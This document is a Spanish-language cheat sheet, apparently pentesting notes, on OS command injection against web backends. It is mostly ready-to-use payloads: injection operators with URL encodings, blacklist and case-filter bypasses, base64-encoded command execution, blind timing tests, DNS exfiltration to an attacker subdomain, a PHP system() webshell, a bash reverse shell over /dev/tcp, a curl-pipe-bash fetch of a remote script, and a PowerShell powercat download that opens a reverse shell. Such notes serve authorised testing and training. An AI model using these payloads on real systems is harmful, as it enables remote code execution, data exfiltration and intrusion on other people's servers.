siempre que se haga una consulta sobre un item a un backend contastar si es posible una injección de comando aparte de una sqli, 
algunos backends corren código para hacer querys sobre aplicaciones légacy ;)

|Nombre | simbolo | hexa | argumento a ejecutar|
|----|---|---|---|
|Semicolon |	; |	%3b |	Both |
|New Line 	| \n |	%0a |	Both | 
|Background | 	& | 	%26 |	Both (second output generally shown first)|
|Pipe 	   |   \| |	\%7c |	Both (only second output is shown) |
|AND 	|     && |	%26%26 |	Both (only if first succeeds)|
|OR 	  |     \|\| |	\%7c%7c |	Second (only if first fails) |
|Sub-Shell | `` |	%60%60 |	Both (Linux-only)|
|Sub-Shell | $() |	%24%28%29 |	Both (Linux-only)|

podemos luego de encontrar el conector entre comandos, si hay algún filtro posterior utilizar diferentes secuencias:


${IFS} inserta un espacio y una tabulación y luego el comando


{ls,-la} agrega comandos como argumentos y agregando espacios en los mismos

para bypassear blacklisted characters se puede utilizar una extracción del caracter del index de una variable de entorno:


${PATH:0:1} (en este caso estaríamos extrayendo el caracter del index 0 de la variable PATH que sería "/"


$env:HOMEPATH[0] mismo ejemplo en windows

podemos concatenar estas técnicas, ej:


127.0.0.1%0a{ls,${PATH:0:1}home}

SQL Injection 	' , ; -- /* */


Command Injection 	; &&


LDAP Injection 	* ( ) & |


XPath Injection 	' or and not substring concat count


OS Command Injection 	; & |


Code Injection 	' ; -- /* */ $() ${} #{} %{} ^


Directory Traversal/File Path Traversal 	../ ..\\ %00


Object Injection 	; & |


XQuery Injection 	' ; -- /* */


Shellcode Injection 	\x \u %u %n


Header Injection 	\n \r\n \t %0d %0a %09



### bypass command blacklisted

podemos agregar caracteres que no son tomados en cuenta en linux y windows como las comillas simples y dobles entre la morfologia del comando

who'am'i

who"am"i

##### Linux only:
who$@ami

w\ho\am\i

##### Windows:
 who^ami

podemos encontrarnos otras medidas como firewalls que nos bloqueen los comandos, con lo cual podemos utilizar diferentes técnicas de bypass:
Case manipulation:

WhOaMi 

Para las terminales case-sensitive como la terminal de linux, podemos utilizar comandos como:

  $(tr "[A-Z]"%09"[a-z]"<<<"WhOaMi")

  
o aplicando un reversing:

##### Linux:

  $(rev<<<'imaohw')

##### Windows:
  iex "$('imaohw'[-1..-20] -join '')"

#### Encodear un comando:

ejemplo de comando pasado a base64:

    echo -n 'cat /etc/passwd | grep 33' | base64

resultado: Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

    payload: bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)


### Blind command injection
Podemos probar blind command injections utilizando comandos que incluyan un temporizador:

parametro= x||ping+-c+10+127.0.0.1||

Redirecting Output:
Podemos también crear archivos internos con la información de los comandos, de esta manera podremos luego visitar el archivo
creado y consultar el resultado:
parametro = || whoami > /var/www/static/whoami.txt ||

Out-of-band exfiltration:
x || nslockup 'whoami'.servidor-del-atacante.com ||
Nos llegara una request a un subdominio con los datos del comando ejecutado.


################## Code injection en un parametro php:
podemos crear una webshell en un parámetro php que ejecuta código de la siguiente manera:

        parameter = ${system($_GET[cmd])}&cmd=


### Obteniendo una shell:



##### crear la shell
        echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.70/4444 0>&1' > rev.sh

##### iniciar un servidor python y un netcat

##### Llamar a la páginacon curl:

##### inyectar código:
        test;curl${IFS}http://10.10.14.49:7000/rev.sh|bash;

##### Obtener una mejor shell:
        script /dev/null -c bash

## RCE en windows

    IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 

##### Levantamos un server python en la carpeta con powercat

##### modificado para web:

    <legit_command>%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<IP>:8000%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<IP>%20-p%20<port>%20-e%20powershell
